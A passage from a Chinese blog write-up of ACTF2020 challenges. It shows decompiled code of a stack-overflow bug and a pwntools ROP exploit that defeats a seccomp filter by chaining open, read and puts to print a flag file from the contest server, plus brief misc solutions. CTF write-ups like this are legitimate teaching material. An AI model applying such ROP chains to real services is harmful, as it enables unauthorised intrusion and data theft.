<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_40087B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"hahaha..."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I have a filter"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"who cares your input"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是栈溢出，不过由于设置了seccomp，很难泄露libc库版本，只能利用程序自身调用的函数。<br>可以利用open函数直接打开flag文件，然后传给read相应文件号3（flag为打开的第四个文件）读取flag，再用puts函数输出flag</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">sh = remote(host=<span class="string">'actf.node.csuaurora.org'</span>, port=<span class="number">28265</span>)</span><br><span class="line"><span class="comment">#sh = process('./rdw')</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">e = ELF(<span class="string">'./rdw'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x400a73</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400a71</span></span><br><span class="line">write_plt = e.plt[<span class="string">'write'</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">open_plt = e.plt[<span class="string">'open'</span>]</span><br><span class="line">read_got = e.got[<span class="string">'read'</span>]</span><br><span class="line">bss_addr = e.bss()</span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">0x50</span> + p64(<span class="number">0x7ff25fb4d9f0</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x601090</span>) + p64(pop_rsi_r15) + p64(<span class="number">0</span>) + <span class="string">b'a'</span> * <span class="number">8</span> + p64(open_plt) + p64(<span class="number">0x400a6a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x601090</span>) + p64(<span class="number">3</span>) + p64(<span class="number">0x400a50</span>) + b  <span class="string">'a'</span> * <span class="number">56</span> + p64(pop_rdi) + p64(<span class="number">0x601090</span>) + p64(puts_plt)</span><br><span class="line">sh.sendafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'./flag'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'input\n'</span>, payload)</span><br><span class="line">sh.recvall()</span><br></pre></td></tr></table></figure>

<h1 id="Misc-部分wp"><a href="#Misc-部分wp" class="headerlink" title="Misc 部分wp"></a>Misc 部分wp</h1><h2 id="饭友记"><a href="#饭友记" class="headerlink" title="饭友记"></a>饭友记</h2><p>改json，修改game/www/data/Map001.json中boss的数据，可以把boss按在地上摩擦，摩擦完会出现flag</p>
<h2 id="密码守护者"><a href="#密码守护者" class="headerlink" title="密码守护者"></a>密码守护者</h2><p>利用Die查壳，发现加了ExeStealth的壳， 然而我还不会脱壳（悲），原本脱完壳扔到IDA里就行，但自己实在太菜，只能边调试边在内存里找压缩包密码，最终在data段找到一串神秘的字符串，解压缩得到flag</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Soinux</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://soinux.github.io/2020/06/06/ACTF2020/">http://soinux.github.io/2020/06/06/ACTF2020/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://soinux.github.io">Soinux's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2020/04/21/format2/"><span>【攻防世界】format2</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By Soinux</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/ Relative)","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":100,"height":180},"mobile":{"show":false},"react":{"opacityDefault":0}});</script></body></html>